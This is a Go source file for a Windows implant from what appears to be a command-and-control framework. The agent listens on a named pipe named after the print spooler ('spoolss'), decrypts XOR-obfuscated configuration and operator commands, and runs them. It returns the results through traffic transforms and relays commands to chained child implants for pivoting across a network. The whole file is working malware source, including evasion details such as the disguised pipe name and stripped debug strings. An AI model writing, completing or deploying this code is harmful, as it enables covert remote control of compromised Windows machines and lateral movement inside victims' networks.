// server/docker/payloads/SMB_Windows/main.go
// SMB-based Windows agent that communicates via named pipes

//go:build windows
// +build windows

package main

import (
	"encoding/base64"
	"encoding/json"
	"fmt"
	"os"
	"os/signal"
	"syscall"
	"time"
)

// Configuration variables - will be replaced at compile time via -ldflags
var (
	// XOR key for decrypting embedded values (same pattern as HTTPS agent)
	xorKey = ""

	// Embedded encrypted configuration blob (XOR encrypted with decrypted secret)
	encryptedConfig = ""

	// Initial client ID from build
	clientID = ""

	// Current sleep interval (seconds) and jitter (percentage)
	sleep  = "30"
	jitter = "10"

	// Secret for encryption (XOR encrypted with xorKey, decrypted at runtime)
	secret = ""

	// Pipe name for the named pipe listener
	pipeName = "spoolss"

	// Debug mode
	debugMode = "false"

	// SMB pipe transforms - embedded at build time, XOR encrypted with xorKey
	// When empty, no transforms are applied (legacy mode)
	smbDataTransforms = ""
)

// Parsed SMB transforms - initialized on first use
var parsedSMBTransforms *SMBDataBlock

// Global managers
var (
	pipeListener  *PipeListener
	commandQueue  *CommandQueue
	resultManager *ResultManager
	secureComms   *SecureComms
)

// Track transform padding lengths for current connection
// These are stored when receiving data and used when sending response
var currentPrependLen, currentAppendLen int

func init() {
	// Parse embedded SMB transforms if configured
	if smbDataTransforms != "" && xorKey != "" {
		// First Base64 decode, then XOR decrypt (matches server-side encryption)
		decoded, err := base64.StdEncoding.DecodeString(smbDataTransforms)
		if err != nil {
			fmt.Printf("[DEBUG:SMB] init: failed to base64 decode transforms: %v\n", err)
			return
		}
		// Decrypt the transforms data using xorKey
		decrypted := xorDecryptBytes(decoded, []byte(xorKey))
		parsedSMBTransforms = parseSMBDataBlock(string(decrypted))
		if parsedSMBTransforms != nil {
			fmt.Printf("[DEBUG:SMB] init: successfully parsed %d transforms\n", len(parsedSMBTransforms.Transforms))
		}
	}
}

// xorDecryptBytes decrypts data using XOR with key
func xorDecryptBytes(data, key []byte) []byte {
	if len(key) == 0 {
		return data
	}
	result := make([]byte, len(data))
	for i, b := range data {
		result[i] = b ^ key[i%len(key)]
	}
	return result
}

func main() {
	fmt.Printf("[DEBUG:SMB] main: starting SMB agent\n")

	// Decrypt embedded configuration
	config, err := decryptConfig(encryptedConfig)
	if err != nil {
		fmt.Printf("[DEBUG:SMB] main: failed to decrypt config: %v\n", err)
		os.Exit(1)
	}
	fmt.Printf("[DEBUG:SMB] main: configuration loaded\n")

	// Initialize command queue and result manager
	commandQueue = NewCommandQueue()
	resultManager = NewResultManager()

	// Create the named pipe listener using the global pipeName variable
	// (set via ldflags during build, defaults to "spoolss")
	activePipeName := pipeName
	if configPipe, ok := config["Pipe Name"]; ok && configPipe != "" {
		activePipeName = configPipe // Override with config if present
	}

	pipeListener, err = NewPipeListener(activePipeName)
	if err != nil {
		fmt.Printf("[DEBUG:SMB] main: failed to create pipe listener: %v\n", err)
		os.Exit(1)
	}
	fmt.Printf("[DEBUG:SMB] main: listening on pipe: %s\n", pipeListener.GetPipePath())

	// Check if transforms are configured
	if parsedSMBTransforms != nil && len(parsedSMBTransforms.Transforms) > 0 {
		fmt.Printf("[DEBUG:SMB] main: SMB transforms configured with %d transforms\n", len(parsedSMBTransforms.Transforms))
	} else {
		fmt.Printf("[DEBUG:SMB] main: no SMB transforms configured (legacy mode)\n")
	}

	// Handle shutdown gracefully
	sigChan := make(chan os.Signal, 1)
	signal.Notify(sigChan, syscall.SIGINT, syscall.SIGTERM)

	go func() {
		<-sigChan
		fmt.Printf("[DEBUG:SMB] main: shutdown signal received\n")
		pipeListener.Close()
		os.Exit(0)
	}()

	// Main loop - wait for connections from HTTPS agents
	fmt.Printf("[DEBUG:SMB] main: entering accept loop\n")
	for {
		conn, err := pipeListener.Accept()
		if err != nil {
			fmt.Printf("[DEBUG:SMB] main: accept error: %v\n", err)
			time.Sleep(time.Second)
			continue
		}
		fmt.Printf("[DEBUG:SMB] main: new connection from HTTPS agent\n")

		// Handle connection in a goroutine
		go handleConnection(conn, config)
	}
}

func handleConnection(conn *PipeConnection, config map[string]string) {
	fmt.Printf("[DEBUG:SMB] handleConnection: new connection\n")
	defer func() {
		conn.Close()
		fmt.Printf("[DEBUG:SMB] handleConnection: connection closed\n")
	}()

	// Perform authentication with the connecting HTTPS agent
	if err := performAuth(conn); err != nil {
		fmt.Printf("[DEBUG:SMB] handleConnection: auth failed: %v\n", err)
		return
	}
	fmt.Printf("[DEBUG:SMB] handleConnection: auth successful\n")

	// Always perform handshake for each new connection
	// Even if we already have clientID/keys, the connecting HTTPS agent needs
	// to receive our handshake data to complete the link
	if err := performHandshake(conn, config); err != nil {
		fmt.Printf("[DEBUG:SMB] handleConnection: handshake failed: %v\n", err)
		return
	}
	fmt.Printf("[DEBUG:SMB] handleConnection: handshake complete, clientID=%s\n", clientID)

	// Main message loop
	fmt.Printf("[DEBUG:SMB] handleConnection: entering main message loop\n")
	for {
		// Read message from HTTPS agent
		fmt.Printf("[DEBUG:SMB] handleConnection: waiting for message...\n")
		rawMessage, err := conn.ReadMessage()
		if err != nil {
			fmt.Printf("[DEBUG:SMB] handleConnection: read error: %v\n", err)
			return
		}
		fmt.Printf("[DEBUG:SMB] handleConnection: received %d bytes\n", len(rawMessage))

		// Try to parse as legacy JSON format first
		var msgEnvelope struct {
			Type    string `json:"type"`
			Payload string `json:"payload"`
		}

		var messageData []byte
		var isTransformed bool

		if err := json.Unmarshal(rawMessage, &msgEnvelope); err == nil && msgEnvelope.Type != "" {
			// Successfully parsed as JSON with type field - legacy format
			fmt.Printf("[DEBUG:SMB] handleConnection: parsed as legacy JSON, type=%s, payload_len=%d\n", msgEnvelope.Type, len(msgEnvelope.Payload))
			isTransformed = false
			messageData = rawMessage
		} else if parsedSMBTransforms != nil && len(parsedSMBTransforms.Transforms) > 0 {
			// Not valid legacy JSON and we have transforms configured
			fmt.Printf("[DEBUG:SMB] handleConnection: trying to reverse transforms\n")
			// Assume it's transformed data - reverse transforms to get JSON envelope
			reversed, err := reverseSMBTransforms(rawMessage, parsedSMBTransforms.Transforms, currentPrependLen, currentAppendLen)
			if err != nil {
				fmt.Printf("[DEBUG:SMB] handleConnection: failed to reverse transforms: %v\n", err)
				continue
			}

			// Parse the reversed data as JSON envelope
			if err := json.Unmarshal(reversed, &msgEnvelope); err != nil {
				fmt.Printf("[DEBUG:SMB] handleConnection: failed to parse reversed data: %v\n", err)
				continue
			}
			fmt.Printf("[DEBUG:SMB] handleConnection: reversed and parsed, type=%s\n", msgEnvelope.Type)
			isTransformed = true
			messageData = reversed
		} else {
			// No transforms configured and not valid JSON - skip
			fmt.Printf("[DEBUG:SMB] handleConnection: invalid message format, raw=%s\n", string(rawMessage[:min(100, len(rawMessage))]))
			continue
		}

		// Store transform mode for response handling
		_ = isTransformed // May be used later for response handling

		switch msgEnvelope.Type {
		case "data":
			fmt.Printf("[DEBUG:SMB] handleConnection: handling data message\n")
			handleServerData(conn, msgEnvelope.Payload)

		case "handshake_response":
			fmt.Printf("[DEBUG:SMB] handleConnection: handling handshake_response\n")
			handleHandshakeResponse(conn, msgEnvelope.Payload)

		case "disconnect":
			fmt.Printf("[DEBUG:SMB] handleConnection: disconnect requested\n")
			return

		default:
			fmt.Printf("[DEBUG:SMB] handleConnection: unknown message type: %s\n", msgEnvelope.Type)
		}

		_ = messageData // Suppress unused warning
	}
}

func handleServerData(conn *PipeConnection, encryptedPayload string) {
	fmt.Printf("[DEBUG:SMB] handleServerData: received payload_len=%d\n", len(encryptedPayload))
	if secureComms == nil {
		fmt.Printf("[DEBUG:SMB] handleServerData: secureComms not initialized\n")
		return
	}

	// DEBUG: Print current secrets (first 16 chars for safety)
	currentSecret := secureComms.GetCurrentSecret()
	fmt.Printf("[DEBUG:SMB] handleServerData: using secret1=%s... (first 16 chars)\n", currentSecret[:min(16, len(currentSecret))])

	// Decrypt the payload
	decrypted, err := secureComms.DecryptMessage(encryptedPayload)
	if err != nil {
		fmt.Printf("[DEBUG:SMB] handleServerData: decrypt failed: %v\n", err)
		fmt.Printf("[DEBUG:SMB] handleServerData: encrypted payload first 64 chars: %s\n", encryptedPayload[:min(64, len(encryptedPayload))])
		return
	}
	fmt.Printf("[DEBUG:SMB] handleServerData: decrypted payload_len=%d\n", len(decrypted))

	// Parse as JSON to check for nested link commands
	var payloadData map[string]interface{}
	if err := json.Unmarshal([]byte(decrypted), &payloadData); err != nil {
		fmt.Printf("[DEBUG:SMB] handleServerData: not JSON, treating as legacy commands array\n")
		// Legacy format - just commands array
		if err := commandQueue.AddCommands(decrypted); err != nil {
			fmt.Printf("[DEBUG:SMB] handleServerData: failed to add commands: %v\n", err)
			return
		}
	} else {
		fmt.Printf("[DEBUG:SMB] handleServerData: parsed as JSON, keys=%v\n", getPayloadKeys(payloadData))
		// New format - may have commands and/or link data

		// Process handshake responses for child agents FIRST (before commands)
		if linkRespVal, ok := payloadData["lr"]; ok {
			if linkRespData, ok := linkRespVal.([]interface{}); ok {
				fmt.Printf("[DEBUG:SMB] handleServerData: processing %d link handshake responses\n", len(linkRespData))
				processLinkHandshakeResponses(linkRespData)
			}
		}

		// Process link commands for child agents (forward to linked SMB agents)
		if linkCmdsVal, ok := payloadData["lc"]; ok {
			if linkCmdsData, ok := linkCmdsVal.([]interface{}); ok {
				fmt.Printf("[DEBUG:SMB] handleServerData: processing %d link commands\n", len(linkCmdsData))
				processLinkCommands(linkCmdsData)
			}
		}

		// Extract commands array if present
		if cmdsVal, ok := payloadData["commands"]; ok {
			cmdsJSON, err := json.Marshal(cmdsVal)
			if err == nil {
				fmt.Printf("[DEBUG:SMB] handleServerData: adding commands from 'commands' field\n")
				commandQueue.AddCommands(string(cmdsJSON))
			}
		}
	}

	// Process commands
	cmdCount := 0
	for {
		result, err := commandQueue.ProcessNextCommand()
		if err != nil {
			continue
		}
		if result == nil {
			break
		}
		cmdCount++
		fmt.Printf("[DEBUG:SMB] handleServerData: processed command %d, output_len=%d\n", cmdCount, len(result.Output))
		// Add result to manager
		resultManager.AddResult(result)
	}
	fmt.Printf("[DEBUG:SMB] handleServerData: processed %d commands total\n", cmdCount)

	// Collect link data from child SMB agents (if any)
	lm := GetLinkManager()
	linkData := lm.GetOutboundData()
	unlinkNotifications := lm.GetUnlinkNotifications()

	hasResults := resultManager.HasResults()
	hasLinkData := len(linkData) > 0
	hasUnlinkNotifications := len(unlinkNotifications) > 0

	fmt.Printf("[DEBUG:SMB] handleServerData: hasResults=%v, hasLinkData=%v, hasUnlinkNotifications=%v\n", hasResults, hasLinkData, hasUnlinkNotifications)

	// Send results back (including any link data from child agents)
	if hasResults || hasLinkData || hasUnlinkNotifications {
		results := resultManager.GetPendingResults()

		payload := map[string]interface{}{
			"agent_id": clientID,
		}

		if len(results) > 0 {
			payload["results"] = results
		}

		// Include link data from child agents (to be forwarded up the chain)
		if hasLinkData {
			payload["ld"] = linkData
		}

		// Include unlink notifications from child agents
		if hasUnlinkNotifications {
			payload["lu"] = unlinkNotifications
		}

		jsonData, err := json.Marshal(payload)
		if err != nil {
			fmt.Printf("[DEBUG:SMB] handleServerData: failed to marshal: %v\n", err)
			return
		}
		fmt.Printf("[DEBUG:SMB] handleServerData: response payload_len=%d\n", len(jsonData))

		// Encrypt with our secret
		encrypted, err := secureComms.EncryptMessage(string(jsonData))
		if err != nil {
			fmt.Printf("[DEBUG:SMB] handleServerData: failed to encrypt: %v\n", err)
			return
		}

		// Send back through pipe with transforms if configured
		fmt.Printf("[DEBUG:SMB] handleServerData: sending response, encrypted_len=%d\n", len(encrypted))
		if err := sendPipeResponse(conn, encrypted); err != nil {
			fmt.Printf("[DEBUG:SMB] handleServerData: failed to send: %v\n", err)
		} else {
			fmt.Printf("[DEBUG:SMB] handleServerData: response sent successfully\n")
		}

		// Rotate secret
		secureComms.RotateSecret()
	} else {
		fmt.Printf("[DEBUG:SMB] handleServerData: no results, sending empty response\n")
		// Still need to send an empty response so parent knows we're done
		emptyPayload := map[string]interface{}{
			"agent_id": clientID,
		}
		jsonData, _ := json.Marshal(emptyPayload)
		encrypted, err := secureComms.EncryptMessage(string(jsonData))
		if err != nil {
			fmt.Printf("[DEBUG:SMB] handleServerData: failed to encrypt empty response: %v\n", err)
			return
		}
		if err := sendPipeResponse(conn, encrypted); err != nil {
			fmt.Printf("[DEBUG:SMB] handleServerData: failed to send empty response: %v\n", err)
		} else {
			fmt.Printf("[DEBUG:SMB] handleServerData: empty response sent successfully\n")
		}
		secureComms.RotateSecret()
	}
}

// getPayloadKeys returns the keys from a map for debug logging
func getPayloadKeys(m map[string]interface{}) []string {
	keys := make([]string, 0, len(m))
	for k := range m {
		keys = append(keys, k)
	}
	return keys
}

// sendPipeResponse sends a response through the pipe, applying transforms if configured
func sendPipeResponse(conn *PipeConnection, encryptedPayload string) error {
	fmt.Printf("[DEBUG:SMB] sendPipeResponse: encrypted_len=%d\n", len(encryptedPayload))

	// Create JSON envelope
	response := map[string]string{
		"type":    "data",
		"payload": encryptedPayload,
	}
	respJSON, err := json.Marshal(response)
	if err != nil {
		fmt.Printf("[DEBUG:SMB] sendPipeResponse: json marshal failed: %v\n", err)
		return err
	}
	fmt.Printf("[DEBUG:SMB] sendPipeResponse: json envelope len=%d\n", len(respJSON))

	// Apply transforms if configured
	if parsedSMBTransforms != nil && len(parsedSMBTransforms.Transforms) > 0 {
		fmt.Printf("[DEBUG:SMB] sendPipeResponse: applying transforms\n")
		result, err := applySMBTransforms(respJSON, parsedSMBTransforms.Transforms)
		if err != nil {
			fmt.Printf("[DEBUG:SMB] sendPipeResponse: transform failed, falling back to legacy: %v\n", err)
			// Fall back to legacy mode on error
			return conn.WriteMessage(respJSON)
		}
		// Store padding lengths for next receive cycle
		currentPrependLen = result.PrependLength
		currentAppendLen = result.AppendLength
		fmt.Printf("[DEBUG:SMB] sendPipeResponse: writing transformed data, len=%d\n", len(result.Data))
		// Write transformed data directly
		return conn.WriteMessage(result.Data)
	}

	// Legacy mode - write JSON directly
	fmt.Printf("[DEBUG:SMB] sendPipeResponse: legacy mode, writing JSON directly\n")
	return conn.WriteMessage(respJSON)
}

func handleHandshakeResponse(conn *PipeConnection, payload string) {
	// This is called when we receive a handshake response from the server
	// The actual handling is done in the handshake.go performHandshake flow
	// logDebug("Received handshake response")
}

// logDebug removed to eliminate debug strings from binary
// func logDebug(format string, v ...interface{}) {
// 	if debugMode == "true" {
// 		log.Printf(format, v...)
// 	}
// }

// processLinkCommands forwards commands from parent to linked (child) SMB agents
// and waits for responses synchronously so they can be included in the same response cycle
func processLinkCommands(linkCmds []interface{}) {
	lm := GetLinkManager()

	for _, cmd := range linkCmds {
		cmdMap, ok := cmd.(map[string]interface{})
		if !ok {
			continue
		}

		routingID, _ := cmdMap["r"].(string)
		payload, _ := cmdMap["p"].(string)

		if routingID == "" || payload == "" {
			continue
		}

		// Forward to the linked agent AND WAIT for response
		response, err := lm.ForwardToLinkedAgentAndWait(routingID, payload, 30*time.Second)
		if err != nil {
			continue
		}

		if response != nil {
			// Queue the response for sending back to parent
			lm.queueOutboundData(response)
		}
	}
}

// processLinkHandshakeResponses forwards handshake responses from parent to child SMB agents
func processLinkHandshakeResponses(linkResps []interface{}) {
	lm := GetLinkManager()

	for _, resp := range linkResps {
		respMap, ok := resp.(map[string]interface{})
		if !ok {
			continue
		}

		routingID, _ := respMap["r"].(string)
		payload, _ := respMap["p"].(string)

		if routingID == "" || payload == "" {
			continue
		}

		// Get the link
		link, exists := lm.GetLink(routingID)
		if !exists {
			continue
		}

		// Send handshake response to child SMB agent
		message := map[string]string{
			"type":    "handshake_response",
			"payload": payload,
		}

		msgJSON, err := json.Marshal(message)
		if err != nil {
			continue
		}

		link.mu.Lock()
		writeMessage(link.Conn, msgJSON)
		link.mu.Unlock()
	}
}
